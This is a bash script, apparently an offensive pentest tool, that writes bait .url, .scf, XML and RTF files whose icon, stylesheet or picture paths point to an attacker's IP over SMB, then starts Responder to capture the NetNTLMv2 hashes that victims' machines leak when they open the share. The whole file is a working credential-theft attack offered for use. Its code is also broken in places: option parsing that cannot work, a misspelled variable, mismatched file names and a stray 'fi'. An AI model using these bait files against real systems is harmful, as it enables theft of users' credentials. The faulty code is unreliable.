#!/bin/bash

#Try to grab NetNTLMv2 hash when uploading to SMB

echo -e '\E[31;40m' "Script used for SMB when uploading file to get NetNTLMv2 hash"; tput sgr0
echo -e '\E[32;40m' "For help use -h argument";tput sgr0
which xterm

if [ $? -ne 0 ]; then
	echo "Downloading xterm and doing and update"
	sudo apt install xterm
	sudo apt update
else 
	echo ""
fi
Help()
{
   # Display Help
   echo "Please add one of the following functions"
   echo
   echo "options:"
   echo "url     Make an url file to upload."
   echo "scf     Make a scf file to upload."
   echo "xml     Make an xml file to upload."
   echo "rtf	 Make a rtf file to upload."
   echo "all	 Make url,scf,hyper and xml."
   echo
}

while getopts url:scf:rtf:xml:all:h arg
do
	case "${arg}" in
		url) url=${OPTARG};;
		scf) sfc=${OPTARG};;
		xml) xml=${OPTARG};;
		rtf) rtf=${OPTARG};;
		all) all=${OPTARG};;
		h) #display help
			Help
			exit;;
	esac
done

if $url; then
	echo -e '\E[31;40m' "LHOST IP";tput sgr0
	read LHOST
	echo -e '\E[31;40m' "INT for responder (ex: eth0 or tun0):";tput sgr0
	read INT
	echo "[InternetShortcut]
URL=whatever
WorkingDirectory=whatever
IconFile=\\\\$LHOST\\%USERNAME%.icon
IconIndex=1" > @evil.url
	echo -e '\E[31;40m' "Upload @evil.url to Remote Share";tput sgr0
	xterm -e "sudo responder -I $INT -wv"
elif $scf; then
	echo -e '\E[31;40m' "LHOST IP"
	read LHOST
	echo -e '\E[31;40m' "INT for responder (ex: eth0 or tun0):";tput sgr0
	read INT
	echo "[Shell]
Command=2
IconFile=\\\\$LHOST\\tools\\nc.ico
[Taskbar]
Command=ToggleDesktop" > @evil.scf
	echo -e '\E[31;40m' "Upload @evil.scf to Remote Share";tput sgr0
	xterm -e "sudo responder -I $INT -wv"
elif $xml; then
	echo -e '\E[31;40m' "LHOST IP"
	read LHOST
	echo "<?xml version='1.0' encoding='UTF-8' standalone='yes'?>
<?mso-application progid='Word.Document'?>
<?xml-stylesheet type='text/xsl' href='\\\\$LHOST\\bad.xsl' ?>" > @bad.xsl
	echo -e '\E[31;40m' "Upload @bad.xsl to Remote Share";tput sgr0
	xterm -e "sudo responder -I $INT -wv"
elif $rtf; then
	echo -e '\E[31;40m' "LHOST IP"
	read LHOST
	echo -e '\E[31;40m' "INT for responder (ex: eth0 or tun0):";tput sgr0
	read INT
	echo "{\\rtf1{\\field{\\*\\fldinst {INCLUDEPICTURE "file://$LHOST/test.jpg" \\\\* MERGEFORMAT\\\\d}}{\fldrslt}}}" > test.rtf
	echo -e '\E[31;40m' "Upload @test.rtf to Remote Share";tput sgr0
	xterm -e "sudo responder -I $INT -wv"
elif $all; then 
	echo -e '\E[31;40m' "LHOST IP"
	read LHOST
	echo -e '\E[31;40m' "INT for responder (ex: eth0 or tun0):";tput sgr0
	read INT
	echo "[InternetShortcut]
URL=whatever
WorkingDirectory=whatever
IconFile=\\\\$LHOST\\%USERNAME%.icon
IconIndex=1" > @evil.url
	echo "[Shell]
Command=2
IconFile=\\\\$LHOST\\tools\\nc.ico
[Taskbar]
Command=ToggleDesktop" > @evil.scf
	echo "<?xml version='1.0' encoding='UTF-8' standalone='yes'?>
<?mso-application progid='Word.Document'?>
<?xml-stylesheet type='text/xsl' href='\\\\$LHOST\\bad.xsl' ?>" > @bad.xsl
	echo "{\\rtf1{\\field{\\*\\fldinst {INCLUDEPICTURE "file://$LHOST/test.jpg" \\\\* MERGEFORMAT\\\\d}}{\fldrslt}}}" > test.rtf
	echo -e '\E[31;40m' "Upload @evil.scf to Remote Share";tput sgr0
	echo -e '\E[31;40m' "Upload @bad.xml to Remote Share";tput sgr0
	echo -e '\E[31;40m' "Upload @test.rtf to Remote Share";tput sgr0
	echo -e '\E[31;40m' "Upload @evil.url to Remote Share";tput sgr0
	xterm -e "sudo responder -I $INT -wv"
else
	echo "firefox https://www.youtube.com/watch?v=ao-Sahfy7Hg"
fi
fi
